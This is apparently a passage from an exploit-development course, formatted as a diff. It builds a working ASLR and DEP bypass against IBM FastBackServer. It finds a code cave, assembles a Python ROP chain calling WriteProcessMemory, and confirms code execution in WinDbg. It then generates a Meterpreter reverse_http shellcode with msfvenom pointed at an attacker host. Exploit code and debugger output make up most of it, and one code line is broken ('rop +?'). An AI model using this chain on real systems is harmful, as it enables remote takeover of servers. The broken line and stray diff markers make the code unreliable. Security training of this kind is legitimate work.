+As highlighted in Listing 42, we've obtained the upper bound of the code section. To locate a code cave, we can subtract a sufficiently-large value from the upper bound to find unused memory large enough to contain our shellcode.
+Instead of parsing the PE header manually, we can use the !dh3 WinDbg command to display all the headers.
+To check if a code cave is indeed present, let's subtract the arbitrary value 0x400, which should be large enough for our shellcode, from the upper bound:
+0:077> dd 03283000-400
+03282c00  00000000 00000000 00000000 00000000
+03282c10  00000000 00000000 00000000 00000000
+03282c20  00000000 00000000 00000000 00000000
+03282c30  00000000 00000000 00000000 00000000
+03282c40  00000000 00000000 00000000 00000000
+03282c50  00000000 00000000 00000000 00000000
+03282c60  00000000 00000000 00000000 00000000
+03282c70  00000000 00000000 00000000 00000000
 
+0:077> ? 03283000-400 - libeay32IBM019
+Evaluate expression: 601088 = 00092c00
 
-```nasm
+0:077> !address 03282c00
 
-```
+Usage:                  Image
+Base Address:           031f1000
+End Address:            03283000
+Region Size:            00092000 ( 584.000 kB)
+State:                  00001000          MEM_COMMIT
+Protect:                00000020          PAGE_EXECUTE_READ
+Type:                   01000000          MEM_IMAGE
+Allocation Base:        031f0000
+Allocation Protect:     00000080          PAGE_EXECUTE_WRITECOPY
+Listing 43 - Code cave at offset 0x92c00
+Listing 43 reveals that we have found a code cave that provides 0x400 bytes of memory. In addition, the memory protection is PAGE_EXECUTE_READ, as expected.
+The code cave starts at offset 0x92c00 into the module. This offset contains a null byte, so we'll use the offset 0x92c04 instead.
+Summarizing the information we gathered so far, we can use offset 0x92c04 together with the leaked module base address as the second argument (lpBaseAddress) to WriteProcessMemory.
+The final three arguments for WriteProcessMemory are simpler. Let's review the function prototype, provided again below.
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+Listing 44 - WriteProcessMemory function prototype
+Because of the stack overflow, our shellcode will be located on the stack after we trigger the vulnerability. Therefore, for the third API argument, we must supply the shellcode's stack address. The fourth argument will be the shellcode size.
+The last argument needs to be a pointer to a writable DWORD where WriteProcessMemory will store the number of bytes that were copied. We could use a stack address for this pointer, but it's easier to use an address inside the data section of libeay32IBM019, as we do not have to gather it at runtime.
+We can use the !dh4 command to find the data section's start address, supplying the -a flag to dump the name of the module along with all header information.
+0:077> !dh -a libeay32IBM019
 
+File Type: DLL
+FILE HEADER VALUES
+     14C machine (i386)
+       6 number of sections
+49EC08E6 time date stamp Sun Apr 19 22:32:22 2009
 
-```nasm
+       0 file pointer to symbol table
+       0 number of symbols
+      E0 size of optional header
+    2102 characteristics
+            Executable
+            32 bit word machine
+            DLL
+...
 
-```
+SECTION HEADER #4
+   .data name
+    F018 virtual size
+   D5000 virtual address
+    CA00 size of raw data
+   D2000 file pointer to raw data
+       0 file pointer to relocation table
+       0 file pointer to line numbers
+       0 number of relocations
+       0 number of line numbers
+C0000040 flags
+         Initialized Data
+         (no align specified)
+         Read Write
+...
+Listing 45 - Enumerating header information
+From Listing 45, we learn that the offset to the data section is 0xD5000, and its size is 0xF018.
+We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let's dump the contents of the address just past the size value.
+0:077> ? libeay32IBM019 + d5000 + f018  + 4
+Evaluate expression: 53297180 = 032d401c
 
+0:077> dd 032d401c
+032d401c  00000000 00000000 00000000 00000000
+032d402c  00000000 00000000 00000000 00000000
+032d403c  00000000 00000000 00000000 00000000
+032d404c  00000000 00000000 00000000 00000000
+032d405c  00000000 00000000 00000000 00000000
+032d406c  00000000 00000000 00000000 00000000
+032d407c  00000000 00000000 00000000 00000000
+032d408c  00000000 00000000 00000000 00000000
 
-```nasm
+0:077> !vprot 032d401c
+BaseAddress:       032d4000
+AllocationBase:    031f0000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              01000000  MEM_IMAGE
 
-```
+0:077> ? 032d401c - libeay32IBM019
+Evaluate expression: 933916 = 000e401c
+Listing 46 - Locating offset to unused DWORD in data section
+Listing 46 shows that we found a writable, unused DWORD inside the data section, which is exactly what we need. It is located at offset 0xe401c from the base address.
+Now that we know what arguments to supply to WriteProcessMemory, let's implement a call to this API using ROP.
+First, we need to reintroduce the code we previously used to trigger the buffer overflow vulnerability in the scanf call (opcode 0x534) into our proof of concept.
+Second, we'll insert a ROP skeleton consisting of the API address, return address, and arguments to use WriteProcessMemory instead of VirtualAlloc. In the previous FastBackServer exploit, we used absolute addresses for ROP gadgets, but in this case (because of ASLR), we'll identify every gadget as libeay32IBM019's base address plus an offset.
+Listing 47 lists the code required to create a ROP skeleton for WriteProcessMemory.
+...
+libeay32IBM019Func = leakFuncAddr(b"N98E_CRYPTO_get_new_lockid", server)
+dllBase = libeay32IBM019Func - 0x14E0
+print(str(hex(dllBase)))
 
+# Get address of WriteProcessMemory
+WPMAddr = leakFuncAddr(b"WriteProcessMemory", server)
+print(str(hex(WPMAddr)))
 
-```nasm
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x700)  # 1st memcpy: size field
+buf += pack("<i", 0x0)    # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x0)    # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
 
-```
+# psCommandBuffer
+wpm  = pack("<L", (WPMAddr))    		    # WriteProcessMemory Address
+wpm += pack("<L", (dllBase + 0x92c04)) 	# Shellcode Return Address
+wpm += pack("<L", (0xFFFFFFFF)) 		      # pseudo Process handle
+wpm += pack("<L", (dllBase + 0x92c04)) 	# Code cave address 
+wpm += pack("<L", (0x41414141)) 		      # dummy lpBuffer (Stack address) 
+wpm += pack("<L", (0x42424242)) 		      # dummy nSize
+wpm += pack("<L", (dllBase + 0xe401c)) 	# lpNumberOfBytesWritten
+wpm += b"A" * 0x10
 
+offset = b"A" * (276 - len(wpm))
+...
+Listing 47 - ROP skeleton to call WriteProcessMemory
+As covered in an earlier exercise, we'll first gather the base address of libeay32IBM019, which we'll store in the dllBase variable.
+Previously, when we used VirtualAlloc without an ASLR bypass, we had to generate and update all the function arguments (including the return and API addresses) at runtime with ROP.
+This case is different. Our ASLR bypass resolves the address of WriteProcessMemory along with the code cave address, which is both the return address and the destination address for our shellcode. The last argument, lpNumberOfBytesWritten, is also calculated as an address inside the data section without the help of a ROP gadget.
+As a result, we only need to dynamically update two values with ROP. We'll update the address of the shellcode on the stack (because it changes each time we execute the exploit) and the size of the shellcode, avoiding NULL bytes.
+We should note that the 276-byte offset from the start of the buffer (used to overwrite EIP) has not changed from the previous module exploit.
+We'll begin updating these values dynamically by focusing on the shellcode's dummy value on the stack. Repeating an earlier technique, we'll obtain a copy of ESP in a different register, align it with the dummy value on the stack, and overwrite it.
+An excellent candidate is shown in Listing 48.
+0x100408d6: push esp ; pop esi ; ret 
+Listing 48 - Gadget to obtain a copy of ESP
+We can use this gadget to cleanly obtain a copy of ESP in ESI.
+From the output of rp++ shown above, we notice that the address of the gadget is 0x100408d6. This address is an absolute address, not an offset. Because of ASLR, we cannot directly use this address, so we'll need to calculate the offset.
+When we execute rp++, it parses the DLL's PE header to obtain the preferred base load address. This address will be written as the gadget address in the output file. We'll use WinDbg to find the preferred base load address for libeay32IBM019.dll, and subtract the value of that address from each gadget we select in our output file.
+The preferred base load address is called the ImageBase in the PE header and is stored at offset 0x34.
+0:077> dd libeay32IBM019 + 3c L1
+031f003c  00000108
 
+0:077> dd libeay32IBM019 + 108 + 34 L1
+031f013c  10000000
+Listing 49 - Finding the preferred base load address
+In the case of libeay32IBM019.dll, this turns out to be 0x10000000 as shown in Listing 49.
+The preferred base load address of libeay32IBM019.dll matches the upper most byte in the gadget addresses given in the rp++ output. To obtain the offset, we can simply ignore the upper 0x100 value.
+We are now ready to create the first part of the ROP chain that replaces the dummy stack address with the shellcode address. We can use a similar approach we used in a previous module but with gadgets from libeay32IBM019.dll.
+The first step is to align the EAX register with the shellcode address on the stack.
+eip = pack("<L", (dllBase + 0x408d6)) # push esp ; pop esi ; ret
 
-```nasm
+# Patching lpBuffer
+rop = pack("<L", (dllBase + 0x296f))    # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242))         # junk into esi
+rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
+rop += pack("<L", (0x88888888))
+rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
+rop += pack("<L", (0x77777878))
+rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
+Listing 50 - ROP chain to align EAX with the shellcode
+Listing 50 shows that the gadget we use to overwrite EIP will copy the stack pointer into ESI. Next, we'll get the stack address from ESI into EAX and increase it, pointing it to the shellcode address on the stack.
+The EAX alignment shown in Listing 50 reuses a technique from a previous module in which we subtract a small value from EAX by, paradoxically, adding a large value in order to avoid NULL bytes.
+In the next step, we update the lpBuffer dummy argument. The gadget we'll use to patch the dummy argument uses the "MOV [EAX], ECX" instruction, so we must move the address of the shellcode into ECX first. We also need to obtain the stack address where the lpBuffer argument should be patched in EAX. A ROP chain to perform this is shown in Listing 51.
+rop += pack("<L", (dllBase + 0x8876d))  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+rop += pack("<L", (0x42424242))         # junk into esi
+rop += pack("<L", (dllBase + 0x48d8c))  # pop eax ; ret 
+rop += pack("<L", (0x42424242))         # junk for ret 0x10
+rop += pack("<L", (0x42424242))         # junk for ret 0x10
+rop += pack("<L", (0x42424242))         # junk for ret 0x10
+rop += pack("<L", (0x42424242))         # junk for ret 0x10
+rop += pack("<L", (0xfffffee0))         # pop into eax
+rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x1fd8))   # mov [eax], ecx ; ret
+Listing 51 - ROP chain to patch lpNumberOfBytesWritten
+As highlighted in the ROP chain above, the first gadget uses a return instruction with an offset of 0x10. As a result, execution will return to the "POP EAX" gadget's address on the stack, and the stack pointer is then increased by 0x10. Because of this we need to insert 0x10 junk bytes before the value (0xfffffee0) that is popped into EAX.
+Next, our ROP chain pops the value 0xfffffee0 into EAX and adds the contents of ECX to it. 0xfffffee0 corresponds to -0x120, which is the correct value to align EAX with the lpBuffer placeholder (shellcode pointer) on the stack. Finally, the last gadget overwrites the lpBuffer argument with the real shellcode address.
+To test this, let's restart FastBackServer and attach WinDbg. If we place a breakpoint on the gadget that writes the real shellcode address on the stack (libeay32IBM019+0x1fd8), we can step over the mov instruction and display the updated ROP skeleton on the stack.
+0:078> bp libeay32IBM019+0x1fd8
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
 
-```
+0:078> g
+Breakpoint 0 hit
+eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360
+eip=03111fd8 esp=0dbbe364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
+03111fd8 8908            mov     dword ptr [eax],ecx  ds:0023:0dbbe2fc=41414141
 
+0:063> p
+eax=0dbbe2fc ebx=05f6c280 ecx=0dbbe41c edx=77251670 esi=42424242 edi=00669360
+eip=03111fda esp=0dbbe364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
+03111fda c3              ret
 
-```nasm
+0:063> dd eax-10 L7
+0dbbe2ec  75f42890 031a2c04 ffffffff 031a2c04
+0dbbe2fc  0dbbe41c 42424242 031f401c
 
-```
+0:063> dd 0dbbe41c L8
+0dbbe41c  44444444 44444444 44444444 44444444
+0dbbe42c  44444444 44444444 44444444 44444444
+Listing 52 - ROP skeleton as seen on the stack
+With the shellcode address correctly patched, our ROP skeleton on the stack is almost complete. Next, we need to overwrite the dummy shellcode size, which in the listing above is represented by 0x42424242.
+As with prior ROP chains, we should reuse as many gadgets as possible when we need to repeat similar actions.
+The shellcode size does not have to be precise. If it is too large, additional stack content will simply be copied as well. Most 32-bit Metasploit-generated shellcodes are smaller than 500 bytes, so we can use an arbitrary size value of -524 (0xfffffdf4) and then negate it to make it positive.
+Listing 53 shows the ROP chain for this step.
+# Patching nSize
+rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
+rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
+rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
+rop += pack("<L", (dllBase + 0xbc79)) # inc eax ; ret
+rop += pack("<L", (dllBase + 0x408dd)) # push eax ; pop esi ; ret 
+rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret 
+rop +? pack("<L", (0xfffffdf4)) 	# -524
+rop += pack("<L", (dllBase + 0x1d8c2)) # neg eax ; ret
+rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+rop += pack("<L", (0x42424242)) # junk into esi
+rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+Listing 53 - Patching nSize with ROP
+In the above ROP chain we first increase EAX (which points to lpBuffer on the stack) by four to align it with the nSize dummy argument.
+Next, we save the updated EAX pointer by copying it to ESI. We do this because with our available gadgets, there's no simple way to obtain the shellcode size in ECX. Instead, we'll use EAX for this arithmetic and then copy the result to ECX.
+For the last copy operation, we'll use a gadget that both copies the content of EAX into ECX and restores EAX from ESI. We have already encountered this gadget in the previous step. It contains a return instruction with an offset of 0x10, which we need to account for in the ROP chain (0x10 junk bytes).
+Let's test this new step by restarting FastBackServer and attaching WinDbg. Once again, we'll set a breakpoint on the gadget that patches values on the stack. We'll continue execution until the breakpoint is triggered a second time.
+0:079> bp libeay32IBM019+0x1fd8
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
 
+0:079> g
+Breakpoint 0 hit
+eax=1223e2fc ebx=073db868 ecx=1223e41c edx=77251670 esi=42424242 edi=00669360
+eip=044e1fd8 esp=1223e364 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
+044e1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:1223e2fc=41414141
 
-```nasm
+0:085> g
+Breakpoint 0 hit
+eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360
+eip=044e1fd8 esp=1223e3a0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
+044e1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:1223e300=42424242
 
-```
+0:085> p
+eax=1223e300 ebx=073db868 ecx=0000020c edx=77251670 esi=42424242 edi=00669360
+eip=044e1fda esp=1223e3a0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
+044e1fda c3              ret
 
+0:085> dd eax-14 L7
+1223e2ec  75f42890 04572c04 ffffffff 04572c04
+1223e2fc  1223e41c 0000020c 045c401c
+Listing 54 - ROP skeleton with nSize overwritten
+Excellent! Listing 54 shows that the ROP chain patched the nSize argument correctly.
+At this point, we have correctly set up the address for WriteProcessMemory, the return address, and all arguments on the stack.
+The last step in our ROP chain is to align EAX with the WriteProcessMemory address in the ROP skeleton on the stack, exchange it with ESP, and return into it.
+We'll do this the same way we aligned EAX earlier. From Listing 54, we know that EAX points 0x14 bytes ahead of WriteProcessMemory on the stack. We can fix that easily with previously used gadgets. The updated ROP chain is shown below.
+# Align ESP with ROP Skeleton
+rop += pack("<L", (dllBase + 0x117c))   # pop ecx ; ret
+rop += pack("<L", (0xffffffec))         # -0x14
+rop += pack("<L", (dllBase + 0x1d0f0))  # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x5b415))  # xchg eax, esp ; ret
+Listing 55 - Aligning ESP with ROP skeleton
+In the above ROP chain, we popped the value -0x14 (0xffffffec) into ECX, added it to EAX, and then used a gadget with an XCHG instruction to align ESP to the stack address stored in EAX.
+After executing this part of the ROP chain, we should return into WriteProcessMemory with all the arguments set up correctly. We can observe this in practice by restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the "XCHG EAX, ESP" gadget.
+0:080> bp libeay32IBM019+0x5b415
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
 
-```nasm
+0:080> g
+Breakpoint 0 hit
+eax=110ee2ec ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
+eip=031bb415 esp=110ee3b0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85:
+031bb415 94              xchg    eax,esp
 
-```
+0:085> p
+eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
+eip=031bb416 esp=110ee2ec ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x86:
+031bb416 c3              ret
 
+0:085> p
+eax=110ee3b0 ebx=05fbf4d8 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
+eip=75f42890 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+KERNEL32!WriteProcessMemoryStub:
+75f42890 8bff            mov     edi,edi
 
-```nasm
+0:085> dds esp L6
+110ee2f0  031f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
+110ee2f4  ffffffff
+110ee2f8  031f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
+110ee2fc  110ee41c
+110ee300  0000020c
+110ee304  0324401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018
+Listing 56 - Executing WriteProcessMemory from ROP
+Listing 56 shows that WriteProcessMemory was invoked and all arguments were set up correctly. We'll note that lpBuffer is stored at 0x110ee41c.
+To verify that WriteProcessMemory copies our dummy shellcode, we can dump the contents of the code cave before and after the API executes.
+0:085> u 031f2c04
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+031f2c04 0000            add     byte ptr [eax],al
+031f2c06 0000            add     byte ptr [eax],al
+031f2c08 0000            add     byte ptr [eax],al
+031f2c0a 0000            add     byte ptr [eax],al
+031f2c0c 0000            add     byte ptr [eax],al
+031f2c0e 0000            add     byte ptr [eax],al
+031f2c10 0000            add     byte ptr [eax],al
+031f2c12 0000            add     byte ptr [eax],al
 
-```
+0:085> pt
+eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
+eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+KERNELBASE!WriteProcessMemory+0x74:
+745f82a4 c21400          ret     14h
 
-```nasm
+0:085> u 031f2c04 
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+031f2c04 44              inc     esp
+031f2c05 44              inc     esp
+031f2c06 44              inc     esp
+031f2c07 44              inc     esp
+031f2c08 44              inc     esp
+031f2c09 44              inc     esp
+031f2c0a 44              inc     esp
+031f2c0b 44              inc     esp
+Listing 57 - WriteProcessMemory copies data into code page
+The contents of the code cave before and after WriteProcessMemory execution show that our fake shellcode data of 0x44 bytes was copied from the stack into the code cave.
+Let's return from WriteProcessMemory and prove that DEP was bypassed by executing the "INC ESP" instructions (0x44 opcode) from the code cave:
+0:085> r
+eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
+eip=745f82a4 esp=110ee2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+KERNELBASE!WriteProcessMemory+0x74:
+745f82a4 c21400          ret     14h
 
-```
+0:085> p
+eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
+eip=031f2c04 esp=110ee308 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+031f2c04 44              inc     esp
 
+0:085> p
+eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
+eip=031f2c05 esp=110ee309 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+libeay32IBM019!N98E_bn_sub_words+0x107d:
+031f2c05 44              inc     esp
 
-```nasm
+0:085> p
+eax=00000001 ebx=05fbf4d8 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
+eip=031f2c06 esp=110ee30a ebp=41414141 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+libeay32IBM019!N98E_bn_sub_words+0x107e:
+031f2c06 44              inc     esp
+Listing 58 - Executing arbitrary instructions
+We have bypassed both ASLR and DEP and have obtained arbitrary code execution. Very Nice!
+In this case, we only executed our padding of 0x44 byte values, but next we'll replace it with shellcode to obtain a reverse shell.
+Exercises
+1.	Go through the ROP chain required to execute WriteProcessMemory and implement it in your own proof of concept.
+2.	Obtain arbitrary code execution inside the code cave.
+3.	Improve the proof of concept to detect and handle bad characters in the ROP gadgets once they are added to the base address of libeay32IBM019.dll.
+1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
+2 http://aerokid240.blogspot.com/2011/03/windows-and-its-pe-file-structure.html
+3 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh
+4 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh
+10.4.2. Getting Our Shell
+At this point, we've achieved our initial goal of bypassing ASLR by leaking the base address of an IBM module. We have also bypassed DEP to obtain code execution.
+To complete our exploit, let's replace our padding data with a Meterpreter shellcode to get a reverse shell.
+First, we'll need to find the offset from the end of the ROP chain to the lpBuffer stack address where our shellcode will reside. This value will be used to calculate the size of the padding area prepended to our shellcode. Next, we'll generate an encoded Meterpreter shellcode to replace the dummy shellcode.
+To figure out the offset, we can display data at an address lower than the value in lpBuffer.
+Earlier, we found lpBuffer at the stack address 0x110ee41c. If we subtract 0x70 bytes, we find the stack content shown in Listing 59.
+0:085> dd 110ee41c-70
+110ee3ac  031bb415 44444444 44444444 44444444
+110ee3bc  44444444 44444444 44444444 44444444
+110ee3cc  44444444 44444444 44444444 44444444
+110ee3dc  44444444 44444444 44444444 44444444
+110ee3ec  44444444 44444444 44444444 44444444
+110ee3fc  44444444 44444444 44444444 44444444
+110ee40c  44444444 44444444 44444444 44444444
+110ee41c  44444444 44444444 44444444 44444444
 
-```
+0:085> ? 110ee41c - 110ee3b0  
+Evaluate expression: 108 = 0000006c
+Listing 59 - Offset from last ROP gadget to lpBuffer
+Here we discover that the offset from the first DWORD after the ROP chain to lpBuffer is 0x6C bytes. We must add 0x6C bytes of padding before placing the shellcode.
+Let's update our proof of concept with a second offset variable (offset2) and some dummy shellcode as shown below.
+...
+offset2 = b"C" * 0x6C
+shellcode = b"\x90" * 0x100
+padding = b"D" * (0x600 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
 
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+shellcode+padding,0,0,0,0)
+buf += formatString
+...
+Listing 60 - Updated proof of concept to include shellcode alignment
+After these changes, lpBuffer will point to our dummy shellcode and WriteProcessMemory will copy the shellcode into the code cave.
+To test the updated proof of concept, we'll restart FastBackServer, attach WinDbg, set a breakpoint on WriteProcessMemory, and launch the exploit:
+0:078> bp KERNEL32!WriteProcessMemoryStub
 
-```nasm
+0:078> g
+Breakpoint 0 hit
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
+eax=0dcde3b0 ebx=060bbf98 ecx=ffffffec edx=76fd1670 esi=42424242 edi=00669360
+eip=75342890 esp=0dcde2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+KERNEL32!WriteProcessMemoryStub:
+75342890 8bff            mov     edi,edi
 
-```
+0:081> dds esp L6
+0dcde2f0  032f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
+0dcde2f4  ffffffff
+0dcde2f8  032f2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
+0dcde2fc  0dcde41c
+0dcde300  0000020c
+0dcde304  0334401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018
 
+0:081> dd 0dcde41c-10 L8
+0dcde40c  43434343 43434343 43434343 43434343
+0dcde41c  90909090 90909090 90909090 90909090
+Listing 61 - Dummy shellcode is aligned correctly
+By subtracting 0x10 bytes from lpBuffer, we can verify that our dummy shellcode starts exactly where lpBuffer points.
+Next, let's generate windows/meterpreter/reverse_http shellcode with msfvenom, remembering to supply the bad characters 0x00, 0x09, 0x0A, 0x0C, 0x0D, and 0x20:
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
+...
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 590 (iteration=0)
+x86/shikata_ga_nai chosen with final size 590
+Payload size: 590 bytes
+Final size of python file: 3295 bytes
+shellcode =  b""
+shellcode += b"\xdb\xd9\xba\xcc\xbb\x60\x18\xd9\x74\x24\xf4"
+shellcode += b"\x58\x33\xc9\xb1\x8d\x31\x50\x1a\x83\xc0\x04"
+shellcode += b"\x03\x50\x16\xe2\x39\x47\x88\x9a\xc1\xb8\x49"
+shellcode += b"\xfb\x48\x5d\x78\x3b\x2e\x15\x2b\x8b\x25\x7b"
+shellcode += b"\xc0\x60\x6b\x68\x53\x04\xa3\x9f\xd4\xa3\x95"
+...
+Listing 62 - Encoded Meterpreter shellcode
+We can now insert the generated shellcode in the proof of concept using the shellcode variable.
+Once again, we'll restart FastBackServer, attach WinDbg, and set a breakpoint on WriteProcessMemory. Listing 63 shows the results from WinDbg when the proof of concept is executed.
+0:078> bp KERNEL32!WriteProcessMemoryStub
 
-```nasm
+0:078> g
+Breakpoint 0 hit
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 
+eax=1111e3b0 ebx=05ebc5b0 ecx=ffffffec edx=77251670 esi=42424242 edi=00669360
+eip=75f42890 esp=1111e2f0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+KERNEL32!WriteProcessMemoryStub:
+75f42890 8bff            mov     edi,edi
 
-```
+0:085> pt
+eax=00000001 ebx=05ebc5b0 ecx=00000000 edx=77251670 esi=42424242 edi=00669360
+eip=745f82a4 esp=1111e2f0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+KERNELBASE!WriteProcessMemory+0x74:
+745f82a4 c21400          ret     14h
 
+0:085> u poi(esp)
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+01bb2c04 dbd9            fcmovnu st,st(1)
+01bb2c06 baccbb6018      mov     edx,1860BBCCh
+01bb2c0b d97424f4        fnstenv [esp-0Ch]
+01bb2c0f 58              pop     eax
+01bb2c10 33c9            xor     ecx,ecx
+01bb2c12 b18d            mov     cl,8Dh
+01bb2c14 31501a          xor     dword ptr [eax+1Ah],edx
+01bb2c17 83c004          add     eax,4
+Listing 63 - Encoded Meterpreter shellcode in memory
+Once we reach the beginning of WriteProcessMemory, we can execute the function to the end and dump the copied shellcode to verify that it's been copied to the code cave.
+Unfortunately, after continuing execution, we encounter an access violation:
+0:085> g
+(1a54.fe8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=01bb2c04 ebx=05ebc5b0 ecx=0000008d edx=1860bbcc esi=42424242 edi=00669360
